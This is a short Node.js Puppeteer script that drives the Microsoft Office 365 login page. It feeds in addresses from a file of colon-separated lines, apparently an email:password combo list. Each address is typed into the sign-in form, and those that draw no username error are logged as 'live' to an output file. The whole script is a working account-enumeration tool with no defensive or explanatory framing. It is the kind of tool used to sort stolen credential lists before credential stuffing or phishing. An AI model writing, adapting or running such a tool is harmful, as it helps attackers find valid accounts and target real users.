const puppeteer = require('puppeteer');
const fs = require('fs');
const readline = require('readline');

(async () => {

  console.log('@@@');
  const browser = await puppeteer.launch({
  	headless: false
  });
  const page = await browser.newPage();

  const inputFile = process.argv[2];
  const outputFile = process.argv[3];
  
  await page.goto('https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&redirect_uri=https%3A%2F%2Fwww.office.com%2Flanding&response_type=code%20id_token&scope=openid%20profile&response_mode=form_post&nonce=637418294194446828.NzAyMGE1NWYtMTE1ZC00MzNlLTliMDUtMWJkMDJlNTRiOTBiNzZhYWEzN2MtZTU4NC00MTE1LWIyYWQtZGRhYzQ0MmNlOTM5&ui_locales=en-US&mkt=en-US&client-request-id=fa90ccd3-ceaa-43a7-b2ad-708ed39e2520&state=ETexh20D6iiC-XALyGdRLWHlf2vyGPbz8FxoXr57c1J6WyazcOYdyCY6Z4viStENXYc2iX2MlYaPs4hTZOif6cBiu-1PXTuF1jhfXTdtvCoDoJWIgBBR8Si89rnYQNPFKKnJpnL8NWJm_--fnuICS4FK9EU4kJk1H0P4rR-2xEHl0_ZMeqKizh2_MrxhfpSW3pWyH31tTiKO9874oOspGONxIFUjNCyXRpScwV0LDfjX2InxVHakDozBfp7oTH_yURFUXfhMoMcES4GgOqeMQQ&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.6.0.0');
  
  await page.waitForSelector('#i0116');
  const mails = await readFile(inputFile);
  for (const mail of mails) {
  	const mailSplit = mail.split(':');
  	await page.evaluate( () => document.getElementById("i0116").value = "");

  	await page.type('#i0116', mailSplit[0]);
  	await page.click('#idSIButton9');

  	await delay(3000);

  	const isUsernameError = await page.evaluate(() => {
  		if (document.querySelector('#usernameError')) {
  			return true;
  		}

  		return false;
  	})

  	if (!isUsernameError) {
  		console.log('mail live: ', mail);
  		fs.appendFileSync(outputFile, mail + '\n');
  		await delay(2000);
  		await page.click('#idBtn_Back');
  		await delay(2000);
  	} else {
  		console.log('mail die: ', mail);
  	}
  }

  await browser.close();
})();

async function delay(ms) {
	return new Promise((resolve, reject) => {
		setTimeout(resolve, ms);
	});
}


async function readFile(filename) {
	return new Promise((resolve, reject) => {
		const myInterface = readline.createInterface({
		  input: fs.createReadStream(filename)
		});

		const data = [];

		myInterface.on('line', function (line) {
		  data.push(line);
		});

		myInterface.on('close', () => {
			resolve(data);
		})
	});
}